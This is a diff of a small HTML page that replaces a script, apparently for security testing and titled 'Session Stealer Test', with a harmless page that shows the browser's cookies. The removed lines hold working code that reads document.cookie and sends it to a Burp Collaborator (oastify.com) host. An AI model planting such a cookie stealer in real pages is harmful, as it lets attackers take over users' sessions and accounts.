@@ -1,22 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Session Stealer Test</title>
+    <title>Show Cookies</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        .cookie-container {
+            border: 1px solid #ddd;
+            padding: 10px;
+            border-radius: 4px;
+            background-color: #f9f9f9;
+        }
+    </style>
 </head>
 <body>
-    <h1>Session Stealer Test</h1>
-    <!-- صورة للتفاعل مع الصفحة -->
-    <img src="https://example.com/your-image.jpg" alt="Image" />
+    <h1>Displayed Cookies</h1>
+    <div class="cookie-container" id="cookie-container">
+        <!-- The cookies will be displayed here -->
+    </div>
 
     <script type="text/javascript">
-        // جمع الكوكيز من المتصفح
-        var cookies = document.cookie;
+        // Function to get all cookies
+        function getCookies() {
+            var cookies = document.cookie;
+            return cookies;
+        }
 
-        // إرسال الكوكيز إلى Burp Collaborator
-        var xhr = new XMLHttpRequest();
-        var url = "https://mf5okvtgabehzrajn6mgz75ktbzbn6bv.oastify.com?cookie=" + encodeURIComponent(cookies);
-        xhr.open("GET", url, true);
-        xhr.send();
+        // Function to display cookies on the page
+        function displayCookies() {
+            var cookieContainer = document.getElementById('cookie-container');
+            var cookies = getCookies();
+            cookieContainer.textContent = cookies ? cookies : 'No cookies found';
+        }
+
+        // Call the function to display cookies
+        displayCookies();
     </script>
 </body>
 </html>
